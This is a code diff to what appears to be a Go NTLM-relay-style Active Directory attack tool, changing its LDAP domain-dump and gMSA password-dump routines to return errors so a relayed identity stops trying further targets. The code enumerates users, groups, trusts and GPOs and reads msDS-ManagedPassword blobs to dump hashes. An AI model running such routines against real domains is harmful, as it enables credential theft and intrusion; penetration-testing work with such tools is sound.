@@ -156,6 +156,15 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 
 	log.Printf("[*] Domain dump on %s (%s)", domain, baseDN)
 
+	// dumpErr collects the first failure so the attack returns an error and the
+	// caller (handleAuth) stops this identity from trying more targets.
+	var dumpErr error
+	noteErr := func(step string, err error) {
+		if err != nil && dumpErr == nil {
+			dumpErr = fmt.Errorf("%s: %v", step, err)
+		}
+	}
+
 	// Users
 	log.Printf("[*] Enumerating domain users...")
 	userResult, err := client.Search(baseDN,
@@ -164,6 +173,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 			"lastLogon", "pwdLastSet", "description", "adminCount"})
 	if err != nil {
 		log.Printf("[-] User enumeration failed: %v", err)
+		noteErr("user enumeration", err)
 	} else {
 		log.Printf("[+] Found %d users:", len(userResult.Entries))
 		for _, entry := range userResult.Entries {
@@ -194,6 +204,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 		[]string{"sAMAccountName", "dNSHostName", "operatingSystem", "operatingSystemVersion"})
 	if err != nil {
 		log.Printf("[-] Computer enumeration failed: %v", err)
+		noteErr("computer enumeration", err)
 	} else {
 		log.Printf("[+] Found %d computers:", len(compResult.Entries))
 		for _, entry := range compResult.Entries {
@@ -211,6 +222,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 		[]string{"sAMAccountName", "distinguishedName", "member", "adminCount"})
 	if err != nil {
 		log.Printf("[-] Group enumeration failed: %v", err)
+		noteErr("group enumeration", err)
 	} else {
 		log.Printf("[+] Found %d groups:", len(groupResult.Entries))
 		for _, entry := range groupResult.Entries {
@@ -232,6 +244,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 		[]string{"name", "trustDirection", "trustType", "trustAttributes"})
 	if err != nil {
 		log.Printf("[-] Trust enumeration failed: %v", err)
+		noteErr("trust enumeration", err)
 	} else {
 		if len(trustResult.Entries) > 0 {
 			log.Printf("[+] Found %d trusts:", len(trustResult.Entries))
@@ -252,6 +265,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 		[]string{"displayName", "gPCFileSysPath", "distinguishedName"})
 	if err != nil {
 		log.Printf("[-] GPO enumeration failed: %v", err)
+		noteErr("GPO enumeration", err)
 	} else if len(gpoResult.Entries) > 0 {
 		log.Printf("[+] Found %d GPOs:", len(gpoResult.Entries))
 		for _, entry := range gpoResult.Entries {
@@ -299,7 +313,7 @@ func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
 		}
 	}
 
-	return nil
+	return dumpErr
 }
 
 // --- RBCD Delegation Attack ---
@@ -1017,12 +1031,23 @@ func dumpGMSAAttack(client *gopacketldap.Client, config *Config) error {
 	}
 
 	found := 0
+
+	// dumpErr collects failures so the attack returns an error and the caller
+	// (handleAuth) stops this identity from trying more targets.
+	var dumpErr error
+	noteErr := func(step string, err error) {
+		if err != nil && dumpErr == nil {
+			dumpErr = fmt.Errorf("%s: %v", step, err)
+		}
+	}
+
 	for _, entry := range result.Entries {
 		sam := entry.GetAttributeValue("sAMAccountName")
 		blobRaw := entry.GetRawAttributeValue("msDS-ManagedPassword")
 
 		if len(blobRaw) == 0 {
 			log.Printf("[-] %s: cannot read msDS-ManagedPassword (insufficient privileges)", sam)
+			noteErr(sam, fmt.Errorf("cannot read msDS-ManagedPassword"))
 			continue
 		}
 
@@ -1032,16 +1057,20 @@ func dumpGMSAAttack(client *gopacketldap.Client, config *Config) error {
 			found++
 		} else {
 			log.Printf("[-] %s: failed to parse gMSA blob", sam)
+			noteErr(sam, fmt.Errorf("failed to parse gMSA blob"))
 		}
 	}
 
 	if found == 0 {
 		log.Printf("[-] No gMSA passwords readable")
+		if dumpErr == nil {
+			dumpErr = fmt.Errorf("no gMSA passwords readable")
+		}
 	} else {
 		log.Printf("[+] Dumped %d gMSA hash(es)", found)
 	}
 
-	return nil
+	return dumpErr
 }
 
 // --- Utility Functions ---
